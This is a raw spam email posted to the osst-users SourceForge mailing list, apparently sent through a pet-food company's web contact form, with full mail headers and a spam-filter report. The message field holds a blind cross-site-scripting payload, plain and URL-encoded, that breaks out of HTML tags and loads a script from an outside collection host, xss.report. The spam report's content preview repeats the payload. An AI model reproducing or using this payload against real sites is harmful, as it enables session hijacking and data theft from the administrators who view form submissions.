Return-Path: <osst-users-bounces@lists.sourceforge.net>
X-Original-To: lists+osst-users@lfdr.de
Delivered-To: lists+osst-users@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 21C12BD14C0
	for <lists+osst-users@lfdr.de>; Mon, 13 Oct 2025 05:00:51 +0200 (CEST)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.sourceforge.net; s=beta; h=Content-Type:Reply-To:List-Subscribe:
	List-Help:List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:Date:To:
	From:MIME-Version:Message-Id:Sender:Cc:Content-Transfer-Encoding:Content-ID:
	Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
	:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=8nG5MNu5abrTSc+7Rc/szZRKb7E8F7duqZl8lqWEAgQ=; b=Lxr0IaI4hU3oaGPw1Wt2BT7laY
	YzHSxZcvGc+Sq+yt4HggVEhlxAtiZZYkuuCBHR5nZ9Ho+IhmElovl4yqitcfogV+WaeiTjzUi8+Dg
	4Mp2P8T5wEuhwOsapWy7X69bfKnOAuboY2Y15PiE1/vUSBELW8GZEnCIDpbFqM84Oydw=;
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
	id 1v88np-0006xQ-DZ
	for lists+osst-users@lfdr.de;
	Mon, 13 Oct 2025 03:00:49 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95) (envelope-from
 <5b283ed1.AWQAAIEStyMAAAAAAAAAAjr2ihAAAYCrS1AAAAAAAAOASgBo7GtP@a229450.bnc3.mailjet.com>)
 id 1v88nk-0006xG-Je for osst-users@lists.sourceforge.net;
 Mon, 13 Oct 2025 03:00:45 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Subject:Content-Transfer-Encoding:Content-Type:
 List-Unsubscribe:Date:To:Reply-To:From:MIME-Version:Message-Id:Sender:Cc:
 Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
 Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Id:
 List-Help:List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=nEbSlXUE9+XqHNFE5zahpk9DDDhrX6ZyNuTwRLIxdvo=; b=mZAs/f6eVXiU1zPTtpokNm6U3i
 G88NINKSp/zns1/M+DGhVMIPBA1xnBI4svsVQgHCRqT5r8BnWhJrh/OLU4j2hpGdSoDgAjRvfQUAB
 T6RFwh3rT600cYkhlVGPodyGcm/86m0YEpd9I7WkGMM6yN8PLo43+jK8mxGHuENwceXk=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Subject:Content-Transfer-Encoding:Content-Type:List-Unsubscribe:Date:To:
 Reply-To:From:MIME-Version:Message-Id:Sender:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Subscribe:
 List-Post:List-Owner:List-Archive;
 bh=nEbSlXUE9+XqHNFE5zahpk9DDDhrX6ZyNuTwRLIxdvo=; b=dgNuKpwgTRtf66E9vykmTg2k6i
 XI4wu6RNrKqkSxWvwiFwO0BQQpjZPo5A5jP7TOv0OUFJQxiAaLCdKSpXy1YsTj5SGZperD5jTj6fB
 f3XjnVmYOzoLRTItVAfP1M/DYu3T5ABa1/R9bPMYCKnqv3mYVBQ173V6ymOmxhjrU3/A=;
Received: from o155.p9.mailjet.com ([87.253.234.155])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES128-GCM-SHA256:128) (Exim 4.95)
 id 1v88nj-0001cs-QN for osst-users@lists.sourceforge.net;
 Mon, 13 Oct 2025 03:00:44 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; q=dns/txt;
 d=gepsa.com; i=webmaster@gepsa.com; s=mailjet; x=1760331631;
 h=message-id:mime-version:from:from:reply-to:to:to:subject:subject:date:date:list-unsubscribe-post:
 list-unsubscribe:feedback-id:x-csa-complaints:x-mj-mid:x-mj-smtpguid:
 x-report-abuse-to:content-type:content-transfer-encoding;
 bh=2c/RAD+mcKSGaDuJCrVtj9gWlLOAv8P6gozZ8KEXmQY=;
 b=UtIcR0Eby1l9WSzhCvCHeNO6PyuiTP97vaqwUIMtfBEDIAD1XWQ2e+hwg
 eL7+aGVeqzEvqkynfX7GvEytG4+2qQNCHrcVMSICGGQmeqESssuO+gZrjKgj
 G/uQaQUHgMfNewlYTkjaWl+55NIH3v6t67goQCHXSLLwTaqFNmUcA0=
Message-Id: <5b283ed1.AWQAAIEStyMAAAAAAAAAAjr2ihAAAYCrS1AAAAAAAAOASgBo7GtP@mailjet.com>
MIME-Version: 1.0
From: GEPSA PET FOODS <webmaster@gepsa.com>
To: osst-users@lists.sourceforge.net
Date: Mon, 13 Oct 2025 03:00:12 +0000
List-Unsubscribe-Post: List-Unsubscribe=One-Click
Feedback-Id: 42.229450.219751:MJ
X-CSA-Complaints: csa-complaints@eco.de
X-MJ-Mid: AWQAAIEStyMAAAAAAAAAAjr2ihAAAYCrS1AAAAAAAAOASgBo7GtPaaKU9BHbR-yn9KfcSzacWQADWmc
X-MJ-SMTPGUID: 69a294f4-11db-47ec-a7f4-a7dc4b369c59
X-REPORT-ABUSE-TO: Message sent by Mailjet please report to
 abuse@mailjet.com with a copy of the message
X-Spam-Score: 5.2 (+++++)
X-Spam-Report: Spam detection software,
 running on the system "sfi-spamd-2.hosts.colo.sdot.me", 
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: Name: Email: \"> \">
 %3E%3C%2FtiTle%3E%3C%2FstYle%3E%3C%2FtexTarea%3E%3C%2FscrIpt%3E%22%2F%2F\'%2F%2F%3E%3CscrIpt%20src%3D%2F%2Fxss.report%2Fc%2Fdreamahi%3E%3C%2FscrIpt%3E
 Content analysis details:   (5.2 points, 5.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature,
 not necessarily valid
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 -0.1 DKIM_VALID_AU Message has a valid DKIM or DK signature from author's
 domain
 0.2 FREEMAIL_REPLYTO_END_DIGIT Reply-To freemail username ends in digit
 [maheemahee4124(at)gmail.com]
 0.0 HEADER_FROM_DIFFERENT_DOMAINS From and EnvelopeFrom 2nd level mail
 domains are different
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 1.8 HTML_IMAGE_ONLY_08     BODY: HTML: images with 400-800 bytes of words
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.6 HTML_MIME_NO_HTML_TAG  HTML-only message, but there is no HTML tag
 2.5 FREEMAIL_FORGED_REPLYTO Freemail in Reply-To, but not From
 0.0 RCVD_IN_MSPIKE_H5      RBL: Excellent reputation (+5)
 [87.253.234.155 listed in wl.mailspike.net]
 0.0 RCVD_IN_MSPIKE_WL      Mailspike good senders
X-VA-Spam-Flag: YES
X-Spam-Flag: YES
X-Headers-End: 1v88nj-0001cs-QN
Subject: [Osst-users] [SPAM] Can you revoke the access??  enquiry
X-BeenThere: osst-users@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <osst-users.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=osst-users>
List-Post: <mailto:osst-users@lists.sourceforge.net>
List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
Reply-To: maheemahee4124@gmail.com
Content-Type: multipart/mixed; boundary="===============2514672261596664714=="
Errors-To: osst-users-bounces@lists.sourceforge.net

--===============2514672261596664714==
Content-Type: text/html; charset=UTF-8
Content-Transfer-Encoding: quoted-printable

Name: <br/>Email: maheemahee4124@gmail.com<br/>Message: \"><NOSCRIPT><p tit=
le=3D\"</NOSCRIPT><script src=3D//xss.report/c/dreamahi></script>\"> %3E%3C=
%2FtiTle%3E%3C%2FstYle%3E%3C%2FtexTarea%3E%3C%2FscrIpt%3E%22%2F%2F\'%2F%2F%=
3E%3CscrIpt%20src%3D%2F%2Fxss.report%2Fc%2Fdreamahi%3E%3C%2FscrIpt%3E   <br=
/>


<img src=3D"http://pzy4.mj.am/oo/AWQAAIEStyMAAAAAAAAAAjr2ihAAAYCrS1AAAAAAAA=
OASgBo7GtPaaKU9BHbR-yn9KfcSzacWQADWmc/8b0bbec5/e.gif" height=3D"1" width=3D=
"1" alt=3D"" border=3D"0" style=3D"height:1px;width:1px;border:0;"/>
=


--===============2514672261596664714==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============2514672261596664714==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Osst-users mailing list
Osst-users@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/osst-users

--===============2514672261596664714==--
